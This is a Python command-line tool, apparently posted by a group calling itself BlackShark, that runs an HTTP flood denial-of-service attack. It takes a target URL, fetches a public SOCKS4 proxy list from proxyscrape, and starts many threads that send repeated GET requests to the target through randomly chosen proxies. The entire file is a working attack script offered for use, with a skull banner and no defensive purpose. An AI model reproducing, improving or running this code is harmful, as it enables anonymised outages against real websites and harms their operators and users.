#!/usr/bin/python3
#Coded by BlackShark
####################################################################
#   #Zero_BlackShark&One_BlackShark&Three_BlackShark          #    #
#   #                                   -- BlackShark offical #    #
####################################################################

import requests
import random
import time
import threading
from colorama import Fore
time.sleep(2)
print(Fore.BLUE+"              .,:ccllllc:,.           ")    
print(Fore.BLUE+"          .lOXWMMMMMMMMMWXOo,         ")         
print(Fore.BLUE+"        .lKWMMMMMMMMMMMMMMMMNk:.      ")  
print(Fore.BLUE+"      .oKWMMMMMMMMMMMMMMMMMMMMNx'     ")  
print(Fore.BLUE+"     .xWMMMMMMMMMMMMMMMMMMMMMMMWO'    ")  
print(Fore.BLUE+"     ;KMMMMMMMMMMMMMMMMMMMMMMMMMWd.   ") 
print(Fore.BLUE+"     :XNKXWMMMMMMMMMMMMMMMMMMNXXWk.   ")  
print(Fore.RED+"      ;Kx.  a0NMMMMMMMMMMMMXkP  ;0d.   ")  
print(Fore.RED+"      .OO'     AOXWMMMMNKkc'    c0:    ")  
print(Fore.RED+"       :KOc,.....:xXNNKd,.....;oKk     ")  
print(Fore.BLUE+"       cXMWXK000XOlccdKK00KXNWMNc     ")  
print(Fore.BLUE+"      .dWMMWX0XMNdcocckMMWX00NMNl.    ")  
print(Fore.BLUE+"      .oXX0o..oWWNNWNXNMMK; .oKxo.    ") 
print(Fore.BLUE+"        ....  cNXNNXXXOKWx.  ..       ")  
print(Fore.BLUE+"              ,KKKX000OKK;            ") 
print(Fore.BLUE+"              '0KKX0KK0X0'            ") 
print(Fore.BLUE+"              .OK0XKKK0XO.            ") 
print(Fore.BLUE+"              .k00K0K00Xk.            ")  
print(Fore.BLUE+"               ldxOxOkx0o             ")  
print(Fore.BLUE+"               ..',,;,',.             ") 
print(Fore.BLUE+"")
print("")
print(Fore.RED+"Socks Dos Using Requests Module In python3 ")
print(Fore.RED+"https://github.com/ZeroBlackShark/DosSkull.git")
time.sleep(1)
print (Fore.BLUE+"> BlackShark offical")
time.sleep(1)
print (Fore.BLUE+"> Current build: 1.0")
time.sleep(3)
print (Fore.GREEN+">>>Code By Zero_BlackShark<<<")
time.sleep(2)
print (Fore.BLUE+"> BlackShark Members:")
print (Fore.CYAN+">>>Zero_BlackShark")
print (Fore.CYAN+">>>One_BlackShark")
print (Fore.CYAN+">>>Three_BlackShark")
print (Fore.BLUE+"_________________________________")
time.sleep(1)
print ("")


#Code By GogoZin 

def opth(): 
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(i+1) + " Created")
	print("Wait A Few Seconds For Threads Ready To Attack ...")
	time.sleep(3)
	input("Press Enter To Launch Attack !")
	global on 
	on = True

on = False
def main():
	global pprr
	global list
	global proxy
	global url
	global pwr
	global thr
	global on
	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
	if cho =='y':
		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') #Code By GogoZin
		with open('socks.txt','wb') as fp:
			fp.write(rsp.content)
			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
	else:
		pass
	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
	if list =="":
		list = 'socks.txt'
	else:
		list = str(list)
	pprr = open(list).readlines()
	print(Fore.BLUE + "Socks Count : " + Fore.WHITE + "%d " %len(pprr))
	pwr = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while on:
			try:
				s.get(url)
				#Code By GogoZin
				try:
					for y in range(pwr):
						s.get(url)
						print(Fore.BLUE + "Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
					s.close
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "Can't Connet To This Socks . . . Skip ~>" + Fore.WHITE)


if __name__ == "__main__":
	main()
